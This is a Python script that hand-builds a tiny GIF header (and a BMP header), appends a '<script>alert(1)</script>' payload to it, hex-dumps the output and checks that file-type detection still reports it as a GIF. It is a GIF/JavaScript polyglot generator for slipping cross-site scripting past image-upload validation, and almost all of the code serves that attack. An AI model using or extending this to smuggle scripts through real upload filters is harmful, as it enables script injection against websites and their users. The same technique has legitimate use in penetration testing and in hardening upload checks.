import os
import sys
import binascii
import puremagic
from PIL import Image, ImageDraw

class Headers:
    def __init__(self):
        self.header = ''

    def gif_header_data(self):
        # GIF Header (13 bytes)
        header  = b'\x47\x49\x46\x38\x39\x61'  # Signature and version  (GIF89a)
        header += b'\x0a\x00'                  # Logical Screen Width   (10 pixels)
        header += b'\x0a\x00'                  # Logical Screen Height  (10 pixels)
        header += b'\x00'                      # GCTF
        header += b'\xff'                      # Background Color       (#255)
        header += b'\x00'                      # Pixel Aspect Ratio

        # Global Color Table + Blocks (13 bytes)
        header += b'\x2c'                      # Image Descriptor
        header += b'\x00\x00\x00\x00'          # NW corner position of image in logical screen
        header += b'\x0a\x00\x0a\x00'          # Image width and height in pixels
        header += b'\x00'                      # No local color table
        header += b'\x02'                      # Start of image
        header += b'\x00'                      # End of image data
        header += b'\x3b'                      # GIF file terminator

        return header

    def bmp_header_data(self, header):
        # BMP Header (14 bytes)
        header  = b'\x42\x4d'          # Magic bytes header       (`BM`)
        header += b'\x1e\x00\x00\x00'  # BMP file size            (30 bytes)
        header += b'\x00\x00'          # Reserved                 (Unused)
        header += b'\x00\x00'          # Reserved                 (Unused)
        header += b'\x1a\x00\x00\x00'  # BMP image data offset    (26 bytes)

        # DIB Header (12 bytes)
        header += b'\x0c\x00\x00\x00'  # DIB header size          (12 bytes)
        header += b'\x01\x00'          # Width of bitmap          (1 pixel)
        header += b'\x01\x00'          # Height of bitmap         (1 pixel)
        header += b'\x01\x00'          # Number of color planes   (1 plane)
        header += b'\x18\x00'          # Number of bits per pixel (24 bits)

        # BMP Image Pixel Array (4 bytes)
        header += b'\x00\x00\xff'      # Red, Pixel (0,1)
        header += b'\x00'              # Padding for 4 byte alignment

        return header


def hex_viewer(filename, is_binary=False):
    try:
        with open(filename, "rb") as f:
            n = 0
            b = f.read(16)
            while b:
                if not is_binary:
                    s1 = " ".join([f"{i:02x}" for i in b])
                    s1 = s1[0:23] + " " + s1[23:]
                    width = 48
                else:
                    s1 = " ".join([f"{i:08b}" for i in b])
                    s1 = s1[0:71] + " " + s1[71:]
                    width = 144
                s2 = "".join([chr(i) if 32 <= i <= 127 else "." for i in b])
                print(f"{n * 16:08x}  {s1:<{width}}  |{s2}|")
                n += 1
                b = f.read(16)
        print(f"{os.path.getsize(filename):08x}")
    except Exception as e:
        print(__file__, ": ", type(e).__name__, " - ", e, sep="", file=sys.stderr)

def create_gif(width, height):
    images = []
    center = width // 2
    color = (0, 0, 0)
    max_radius = int(center * 1.5)
    step = 8
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

    for i in range(0, max_radius, step):
        im = Image.new('RGB', (width, height), color)
        draw = ImageDraw.Draw(im)
        draw.ellipse((center - i, center - i, center + i, center + i), fill=color)
        images.append(im)

    images[0].save(os.path.join(BASE_DIR, 'name.gif'), save_all=True)

def inject(payload, contents, out_file):
    f = open(out_file, "w+b")
    f.write(contents)
    f.write(b'\x2f\x2f\x2f\x2f\x2f')
    f.write(payload)
    f.write(b'\x3b')
    f.close()

if __name__ == '__main__':
    final_filename = 'output.gif'
    payload = '<script>alert(1)</script>'.encode()
    create_gif(200, 150)
    gif_header = Headers().gif_header_data()
    inject(payload, gif_header, final_filename)
    hex_viewer(final_filename)

    print("Image details")
    print("Name: ", puremagic.magic_file(final_filename)[0].name)
    print("Extension: ", puremagic.magic_file(final_filename)[0].extension)
    print("Mime type: ", puremagic.magic_file(final_filename)[0].mime_type)
    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('utf-8'))